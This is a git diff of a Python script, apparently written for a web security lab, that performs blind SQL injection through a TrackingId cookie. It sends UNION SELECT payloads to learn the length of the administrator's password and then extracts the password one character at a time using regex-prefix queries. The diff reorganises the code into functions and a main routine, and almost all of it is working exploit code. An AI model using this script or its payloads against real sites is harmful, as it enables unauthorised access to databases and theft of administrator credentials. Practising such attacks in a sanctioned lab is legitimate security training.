@@ -23,7 +23,7 @@ query_pass = f"x' UNION SELECT username FROM users WHERE username='administrator
 #the functions it called from
 #takes a query as the arg
 def try_query(query):
-    print(f'Query: {query}')
+    #print(f'Query: {query}')
     mycookies = {'TrackingId': urllib.parse.quote_plus(query) }
     resp = requests.get(url, cookies=mycookies)
     soup = BeautifulSoup(resp.text, 'html.parser')
@@ -32,54 +32,65 @@ def try_query(query):
     else:
         return False
 
-#Tests the query fucntion
-print(try_query("""x' OR 1=1 --"""))
-print(try_query("""x" OR 1=1 --"""))
+def DetermineLength():
+    '''
+    Determines the length of the password
+    by locating the admin password length in SQL
+    '''
+    #Tests the query fucntion
+    try_query("""x' OR 1=1 --""")
+    try_query("""x" OR 1=1 --""")
 
-'''
-Determines the length of the password
-by locating the admin password length in SQL
-'''
-begin_time = time.perf_counter()
-num = 1
-while True:
-    query = f"x' UNION SELECT username FROM users WHERE username='administrator' AND length(password)={num}--"
-    print(f'Trying length {num}')
-    if try_query(query) == False:
-        num = num + 1
-    else:
-        break
+    begin_time = time.perf_counter()
+    num = 1
+    while True:
+        query = f"x' UNION SELECT username FROM users WHERE username='administrator' AND length(password)={num}--"
+        print(f'Trying length {num}')
+        if try_query(query) == False:
+            num = num + 1
+        else:
+            break
 
-print(f"Password length is {num}")
-print(f"Time elapsed is {time.perf_counter()-begin_time}")
+    #print(f"Password length is {num}")
+    #print(f"Time elapsed is {time.perf_counter()-begin_time}")
+    return(num)
 
-
-'''
-Begins Linear search to determine the password for the program
-First for loop collects the first character of the password
-'''
-for i in range(len(characters)):
-    query1 = f"{query_pass} ~ '^{characters[i]}'--"
-    if try_query(query1) == False:
-        pass
-    else:
-        print(f"Password begins with {characters[i]}")
-        try_password.append(characters[i])
-        break
-
-'''
-Iterates through the rest of the password
--Takes the number of characters from above 
-and uses that as a bound.
-'''
-for i in range(num-1):
-    print(f"Current Password: {try_password[0]}")
+def LinearSearch(arr, password_length):
+    '''
+    First Loop:
+        Begins Linear search to determine the password for the program
+        First for loop collects the first character of the password
+    Second Loop:
+        Iterates through the rest of the password
+        -Takes the number of characters from above 
+        and uses that as a bound.
+    '''
     for i in range(len(characters)):
-        query2 = f"{query_pass} ~ '^{try_password[0]+characters[i]}'--"
-        if try_query(query2) == False:
+        query1 = f"{query_pass} ~ '^{characters[i]}'--"
+        if try_query(query1) == False:
             pass
         else:
-            print(f"Password starts with {try_password[0]+characters[i]}")
-            try_password[0] = try_password[0]+characters[i]
+            print(f"Password begins with {characters[i]}")
+            try_password.append(characters[i])
             break
-            
+
+    for i in range(password_length-1):
+        #print(f"Current Portion of Password: {try_password[0]}")
+        for i in range(len(characters)):
+            query2 = f"{query_pass} ~ '^{try_password[0]+characters[i]}'--"
+            if try_query(query2) == False:
+                pass
+            else:
+                print(f"Password starts with {try_password[0]+characters[i]}")
+                try_password[0] = try_password[0]+characters[i]
+                break
+    return(try_password[0])
+
+if __name__ == '__main__':
+    print("Getting Length of Password String...")
+    length = DetermineLength()
+    print(f'Password Length: {length}')
+
+    print("Finding Password...")
+    LinearSearch(characters, length)
+    print(f'Password: {try_password}')
